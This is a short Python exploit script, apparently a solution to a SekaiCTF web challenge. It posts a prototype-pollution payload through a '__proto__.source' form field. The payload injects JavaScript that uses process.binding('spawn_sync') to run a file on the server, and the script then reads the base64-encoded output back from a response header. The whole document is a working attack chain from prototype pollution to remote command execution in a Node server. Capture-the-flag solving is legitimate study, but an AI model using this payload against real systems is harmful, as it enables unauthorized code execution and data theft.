import requests, base64

base_url = "http://127.0.0.1:1337"
# base_url = "https://vite-bjkv8aqvjdlb.chals.sekai.team/"

resp = requests.post(
    f"{base_url}/a",
    data={
        "__proto__.source": """
Object.prototype.flag = btoa(process.binding('spawn_sync').spawn({ file: '/flag', args: [ '/flag' ], stdio: [ {type:'pipe',readable:!0,writable:!1}, {type:'pipe',readable:!1,writable:!0}, {type:'pipe',readable:!1,writable:!0} ]}).output.toString())
""",
    },
    headers={
        "Origin": base_url,
    },
    verify=False,
)

print(base64.b64decode(resp.headers['flag']).decode())